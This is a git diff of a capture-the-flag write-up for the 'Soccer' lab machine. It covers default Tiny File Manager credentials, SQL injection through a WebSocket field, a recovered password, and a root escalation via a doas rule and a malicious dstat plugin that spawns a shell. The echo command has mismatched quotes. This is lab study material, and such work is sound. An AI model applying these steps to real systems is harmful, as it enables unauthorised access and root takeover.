@@ -22,19 +22,13 @@ User FLAG
 19. Get user flag
 
 ## Info
+There is a path /tiny which uses tinyfilemanager (found with feroxbuster)
 
-Nothing at local/session storage -- not relevant
-Nothing in the source code -- not relevant in first app
+`Credentials`
+Default username/password: admin/admin@123 (found here https://github.com/prasathmani/tinyfilemanager?tab=readme-ov-file#how-to-use)
 
-There is a path /tiny which uses tinyfilemanager -- yes
-
-Credentials
-Default username/password: admin/admin@123 -- yes
-
-Expressjs running on new hostname -- yes
-Set-Cookie: connect.sid=s%3AW6OeVgCFtvL35TpGKSPBD4iY3_0S7OU2.ITMDSN4vKobEvEKQAB4Juf9QHkydF1a6A5Wea8TVlwI; -- not relevant
-
-Found this code in the source -- yes
+Expressjs running on new hostname (Wappalyzer)
+Found this code in the source
 
 ```js
 var ws = new WebSocket("ws://soc-player.soccer.htb:9091"); // We can use this later!
@@ -46,7 +40,7 @@ function sendText() {
     var msg = input.value;
     if (msg.length > 0) {
         ws.send(JSON.stringify({
-            "id": msg
+            "id": msg // This is used as the payload
         }))
     }
     else append("????????")
@@ -77,31 +71,6 @@ At this point we have the db name, we can dump it with sqlmap too, and there we 
 
 ### Inside machine
 
-Ports -- not relevant
-33060
-3306
-80
-53
-22
-3000
-9091
-
-Versions -- not relevant
-mysql  Ver 8.0.31-0ubuntu0.20.04.2 for Linux on x86_64 ((Ubuntu))
-Sudo version 1.8.31
-Linux soccer 5.4.0-135-generic
-
-SGID -- not relevant
-daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-
-Routes -- not relevant
-/usr/lib/mysql/plugin/component_mysqlbackup.so
-/etc/mysql/debian.cnf
-/data                                                                                     
-/vagrant
-/snap/core20/1695/etc/cloud/cloud.cfg
-
--- yes
 ```bash
 ls -al /etc/nginx/sites-enabled
 total 8
@@ -110,12 +79,6 @@ drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
 lrwxrwxrwx 1 root root   34 Nov 17  2022 default -> /etc/nginx/sites-available/default
 lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
 ```
-
--- not relevant
-From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                     
-Found readable /etc/mysql/my.cnf                                                                                                                                                    
-!includedir /etc/mysql/conf.d/                                                                                                                                                      
-!includedir /etc/mysql/mysql.conf.d/q
 
 ## Versions
 
@@ -128,7 +91,76 @@ back-end DBMS: MySQL >= 5.0.12
 
 xmltec-xmlmail
 
+## Password
+
+PlayerOftheMatch2022
+
+Root FLAG
+-----
+
+1. Find SUID files
+2. Found that doas is installed
+3. Check doas configuration
+4. Found that we can execute dstat as root
+5. Create a plugin for dstat
+6. Execute dstat with the plugin
+7. Obtain root flag
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/doas # The one we are looking for, others are not relevant
+```
+
+### What is doas?
+
+doas is used to assume the identity of another user on the system. 
+
+where is configuration?
+
+Usually at `/etc/doas.conf` but in this case is at `/usr/local/etc/doas.conf`
+
+You can find the configuration with the following command
+
+```bash
+whereis doas.conf
+locate doas.conf
+```
+
+```bash
+cat /usr/local/etc/doas.conf 
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+Knowing that we can execute the following command `/usr/bin/dstat`
+
+We are going to research about how to use dstats to obtain a shell. For this we can use GTFOBins.
+
+`dstat` allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the `dstat` man page under “FILES”:
+
+```shell
+~/.dstat/
+(path of binary)/plugins/
+/usr/share/dstat/
+/usr/local/share/dstat/
+```
+
+After researching with `ls -la` we found that `/usr/local/share/dstat/` exists and we can write in it.
+
+With this simple information we can create a python script to obtain a shell with root privileges.
+
+```bash
+echo "import os; os.execv('/bin/sh', ["sh"])' > dstat_shell.py
+```
+
+```bash
+doas -u root /usr/bin/dstat --shell
+```
+
+Congratulations! You have obtained root access to the machine.
+
 ## Links
 
+- https://wiki.archlinux.org/title/Doas
+- https://gtfobins.github.io/gtfobins/dstat/
 - https://tinyfilemanager.github.io/
 - https://github.com/sqlmapproject/sqlmap
